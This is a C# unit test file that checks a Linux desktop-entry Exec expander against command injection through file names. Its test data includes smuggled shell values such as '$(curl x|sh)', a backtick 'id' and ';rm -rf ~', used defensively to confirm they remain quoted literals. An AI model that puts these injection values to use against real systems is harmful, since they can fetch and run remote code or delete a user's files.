// Copyright (c) Files Community
// Licensed under the MIT License.

using Files.Platform.Abstractions.Mime;
using Files.Platform.Linux.Launching;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using System.Linq;

namespace Files.Platform.Tests.Launching
{
	[TestClass]
	public sealed class DesktopExecInjectionTests
	{
		private static readonly string[] Nasty =
		[
			"/tmp/$(curl x|sh).txt",
			"/tmp/`id`.txt",
			"/tmp/a;rm -rf ~.txt",
			"/tmp/it's \"quoted\".txt",
			"/tmp/with space.txt",
			"/tmp/new\nline.txt",
			"/tmp/back\\slash.txt",
			"-rf",
		];

		private static string[][] Expand(string exec, params string[] targets) =>
			[.. DesktopExecExpander.Expand(new DesktopApplication("t.desktop", "Test App", exec, "/usr/share/applications/t.desktop"), targets).Select(x => x.ToArray())];

		private static string Safe(string name) => name.StartsWith('-') ? "./" + name : name;

		[TestMethod]
		public void PlainExec_KeepsEachValueOneLiteralArgument()
		{
			foreach (var name in Nasty)
			{
				var argv = Expand("viewer %f", name);
				Assert.AreEqual(1, argv.Length);
				Assert.AreEqual(2, argv[0].Length, name);
				Assert.AreEqual(Safe(name), argv[0][1]);
			}
		}

		[TestMethod]
		public void MultipleFiles_AreSeparateLiteralArguments()
		{
			var argv = Expand("viewer %F", Nasty)[0];

			Assert.AreEqual(Nasty.Length + 1, argv.Length);
			for (var i = 0; i < Nasty.Length; i++)
				Assert.AreEqual(Safe(Nasty[i]), argv[i + 1]);
		}

		[TestMethod]
		public void ShellDashC_ValueIsSingleQuotedInScript()
		{
			foreach (var name in Nasty)
			{
				var argv = Expand("sh -c \"app %f\"", name)[0];
				Assert.AreEqual(3, argv.Length);
				Assert.AreEqual("sh", argv[0]);
				Assert.AreEqual("-c", argv[1]);
				Assert.AreEqual("app " + DesktopExecExpander.ShellQuote(Safe(name)), argv[2]);
			}

			Assert.AreEqual("app '/tmp/$(curl x|sh).txt'", Expand("sh -c \"app %f\"", Nasty[0])[0][2]);
			Assert.AreEqual("app '/tmp/it'\\''s \"quoted\".txt'", Expand("sh -c \"app %f\"", Nasty[3])[0][2]);
		}

		[TestMethod]
		public void ShellDashC_MultipleFiles_AreEachQuoted()
		{
			var argv = Expand("bash -c \"app %F\"", "/a b", "/c'd")[0];

			Assert.AreEqual("app '/a b' '/c'\\''d'", argv[2]);
		}

		[TestMethod]
		public void ShellSingleQuotedScript_AndUriCodes()
		{
			var argv = Expand("bash -c 'app %U; echo %c'", "/tmp/$(x).txt")[0];

			Assert.AreEqual("app 'file:///tmp/$(x).txt'; echo 'Test App'", argv[2]);
			Assert.AreEqual("app '/it'\\''s'", Expand("bash -c 'app %f'", "/it's")[0][2]);
		}

		[TestMethod]
		public void NameAndDesktopPath_AreQuoted()
		{
			var app = new DesktopApplication("t.desktop", "Evil $(x) 'name'", "sh -c \"echo %c %k\"", "/a b/t.desktop");

			var argv = DesktopExecExpander.Expand(app, [])[0];

			Assert.AreEqual("echo 'Evil $(x) '\\''name'\\''' '/a b/t.desktop'", argv[2]);
		}

		[TestMethod]
		public void UnbalancedQuotes_AreRejected()
		{
			Assert.AreEqual(0, Expand("viewer \"unterminated %f", "/x").Length);
			Assert.AreEqual(0, Expand("viewer 'oops %f", "/x").Length);
			Assert.IsNull(DesktopExecExpander.Tokenize("a \"b"));
		}
	}
}
